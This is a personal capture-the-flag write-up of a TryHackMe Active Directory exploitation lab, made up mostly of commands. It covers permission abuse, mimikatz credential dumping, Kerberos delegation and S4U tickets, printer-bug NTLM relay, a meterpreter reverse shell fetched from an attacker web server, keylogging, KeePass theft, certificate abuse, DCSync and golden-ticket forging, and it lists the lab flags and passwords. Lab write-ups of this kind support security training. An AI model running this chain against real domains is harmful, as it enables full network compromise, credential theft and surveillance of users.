---
tags:
  - AD
  - THM
  - Pentesting
---
# Exploring Active Directory

```shell
cat /etc/resolv.conf
search za.tryhackme.com
nameserver 10.200.83.101 
nameserver 9.9.9.9

# Shorten name resolution timeouts to 1 second
options timeout:1
# Only attempt to resolve a hostname 2 times
options attempts:2
```

Verify functionality: `dig thmdc.za.tryhackme.loc` or  `nslookup thmdc.za.tryhackme.loc`

<http://distributor.za.tryhackme.loc/creds>

```shell
export AD=za.tryhackme.loc
export USERNAME=jason.jackson
export PASSWORD=Racer2018
```

`ssh $AD\\$USERNAME@thmwrk1.$AD`

## Task 2

```shell
neo4j console
bloodhound --no-sandbox
```

Import provided Archive into Bloodhound.

Search for `jason.jacksonS@ZA.TRYHACKME.LOC` and track `TIER 2 ADMINS@ZA.TRYHACKME.LOC`

In the ssh session

```cmd
powershell.exe
```

```powershell
Add-ADGroupMember "IT Support" -Members "jason.jackson"
Get-ADGroupMember -Identity "IT Support" # verify jason belongs to support
Get-ADGroupMember -Identity "Tier 2 Admins" # identify Tier 2 Admins for PW reset
$Password = ConvertTo-SecureString "StrongPass123" -AsPlainText -Force
# this can take some time close/reconnect your session and/or 
# gpupdate /force
Set-ADAccountPassword -Identity "t2_henry.harvey" -Reset -NewPassword $Password
```

```shell
export t2user=t2_henry.harvey
export t2pass=StrongPass123
```

> GenericWrite

![GenericeWrite](images/Pasted%20image%2020240616124809.png)

```shell
xfreerdp /v:thmwrk1.za.tryhackme.loc /u:$t2user /p:$t2pass
```

```powershell
cd C:\Users\Administrator\Desktop
type .\flag1.txt
```

> THM{Permission.Delegation.FTW!}

## Task 3

```shell
export AD=za.tryhackme.loc
export t2user=t2_henry.harvey
export t2pass=StrongPass123
```

`ssh $AD\\$t2user@thmwrk1.$AD`

```powershell
Import-Module C:\Tools\PowerView.ps1
Get-NetUser -TrustedToAuth
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```

```plain
# mimikatz
# --------

privilege::debug
token::elevate
lsadump::secrets
token::revert
```

> svcIIS:Password1@

>> New Terminal - Windows

```powershell
C:\Tools\kekeo\x64\kekeo.exe
```

```plain
# kekeo
# -----

tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@

tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc

tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc
```

```plain
# mimikatz
# --------

kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

misc::cmd
```

```CMD
klist
winrs -r:thmserver1.za.tryhackme.loc cmd
cd C:\Users\Administrator\Desktop
type .\flag2.txt
```

> Unconstrained Delegation

> Resource-Based Constrained Delegation

> CIFS

> THM{Constrained.Delegation.Can.Be.Very.Bad}

## Task 4

```powershell
Get-WmiObject Win32_Printer -Computer thmserver2.za.tryhackme.loc
Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc
```

```bash
nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc

dig thmserver1.za.tryhackme.loc

sudo impacket-ntlmrelayx -smb2support -t smb://"10.200.83.201" -c 'whoami /all' -debug
```

FROM THMWRK1 RDP

```powershell
C:\Tools\SpoolSample.exe THMSERVER2.za.tryhackmloc 10.50.81.66 # ip a s exploitad
```

> 30

> SMB signing

```cmd
# WinRM / mimikatz cmd shell from previous task
# ----------------------------------------------

cd C:\Users\Administrator.ZA\Desktop
type .\flag3.txt
```

> THM{Printing.Some.Shellz}

## Task 5

```cmd
# WinRM / mimikatz cmd shell / Task 3
# ------------------------------------

dir C:\Users\trevor.local\Documents
04/30/2022  04:36 PM             2,190 PasswordDatabase.kdbx
```

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=exploitad LPORT=443 -f psh -o service.ps1

sudo msfconsole

use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST exploitad
set LPORT 443
options
run
```

```bash
sudo python -m http.server 80
```

```powershell
# WinRM / mimikatz cmd shell / Task 3
# ------------------------------------

powershell.exe -ep bypass

$wc = New-Object Net.WebClient
$wc. DownloadFile('http://10.50.81.66/service.ps1', "$PWD\service.ps1")
dir
.\service.ps1
```

```shell
# meterpreter remote shell
# ------------------------

ps | grep "explorer"
migrate PID

keyscan_start # wait couple minutes
keyscan_dump
keyscan_stop

cd C:/Users/trevor.local/Documents
download PasswordDatabase.kdbx
```

**On Problems**:  If you do not see an explorer.exe process for the trevor.local user, you can start the process yourself by performing the following steps:

1. Reset the password of the trevor.local user using the following command: `net user trevor.local <chosen password>`
2. Run the following in powershell: `C:\auto-login.ps1 trevor.local <chosen password> THMSERVER1`
3. Reboot the server using `shutdown -r`
4. Once the server is back online, you should see the explorer process.

# Keepass #kpcli

```bash
# Password is the captured one

keepassxc PasswordDatabase.kdbx 

# -- alternative ---

kpcli
open PasswordDatabase.kdbx
ls
ls PasswordDatabase/*
show -f -a PasswordDatabase/General/Flag

THM{AD.Users.Can.Give.Up.Good.Secrets}

show -f -a PasswordDatabase/General/svcServMan

Sup3rStr0ngPass!@
```

> keepass

> migrate

> Imreallysurenoonewillguessmypassword

> THM{AD.Users.Can.Give.Up.Good.Secrets}

## Task 6

```powershell
runas /netonly /user:za.tryhackme.loc\svcServMan cmd.exe

mmc.exe
gpupdate /force
```

```bash
dig THMSERVER2.za.tryhackme.loc

export USERNAME=jason.jackson
export PASSWORD=Racer2018

`ssh $AD\\$USERNAME@server2.$AD`

cd C:\Users\Administrator\Desktop>
type .\flag4.txt
```

![Preview](images/GPO.gif)

> Group Policy Objects

> Group Policy Management

> Management Server Pushes

> THM{Exploiting.GPOs.For.Fun.And.Profit}

## Task 7

```bash
export USERNAME=jason.jackson
export PASSWORD=Racer2018
xfreerdp /v:THMSERVER2.za.tryhackme.loc /u:$USERNAME /p:$PASSWORD /cert:ignore
```

![Preview](images/cert.gif)

```powershell
mmc.exe

# Set password for privKey export - I forgot it the first time I tried xD

 C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:.\f4u.pfx /password:f4upass /outfile:f4u.kirbi /domain:za.tryhackme.loc /dc:10.200.83.101

C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```

```plain
# mimikats

privilege::debug
kerberos::ptt f4u.kirbi
misc::cmd
```

```cmd
explorer.exe

# OR

type \\THMDC.za.tryhackme.loc\C$\dns_entries.csv
type \\THMDC.za.tryhackme.loc\C$\Users\Administrator\Desktop\flag5.txt

```

```plain
\\THMDC.za.tryhackme.loc\C$`
```

```
```plain
# dns_entries.csv
HostName,IPEnd
example,"200"
THMSERVER1,"201"
THMSERVER2,"202"
THMWRK1,"248"
THMWRK2,"249"
THMDC,"101"
"distributor","201"
za.tryhackme.loc,"101"
```

```plain
\\THMDC.za.tryhackme.loc\C$\Users\Administrator\Desktop
```

> Certificate signing request

> Active Directory Certificate Services

>THM{AD.Certs.Can.Get.You.DA}

## Task 8

```powershell
# mimikatz session from previous task
# -----------------------------------

lsadump::dcsync /user:za\krbtgt
```

```powershell
Get-ADComputer -Identity "THMDC"


DistinguishedName : CN=THMDC,OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
DNSHostName       : THMDC.za.tryhackme.loc
Enabled           : True
Name              : THMDC
ObjectClass       : computer
ObjectGUID        : bd651750-782b-4b09-93b4-b5987ec7311b
SamAccountName    : THMDC$
SID               : S-1-5-21-3885271727-2693558621-2658995185-1001
UserPrincipalName :
```

```powershell
Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc


DistinguishedName : CN=Enterprise Admins,CN=Users,DC=tryhackme,DC=loc
GroupCategory     : Security
GroupScope        : Universal
Name              : Enterprise Admins
ObjectClass       : group
ObjectGUID        : a23ae384-16e8-44d5-9b36-8173c4e0e5de
SamAccountName    : Enterprise Admins
SID               : S-1-5-21-3330634377-1326264276-632209373-519
```

```powershell
# mimikatz session from previous task
# -----------------------------------

kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt
```

```powershell
type \\thmrootdc.tryhackme.loc\C$\Users\Administrator\Desktop\flag6.txt
```

> Directional trust

> krbtgt

> Inter-Realm TGT

> THM{Full.EA.Compromise}
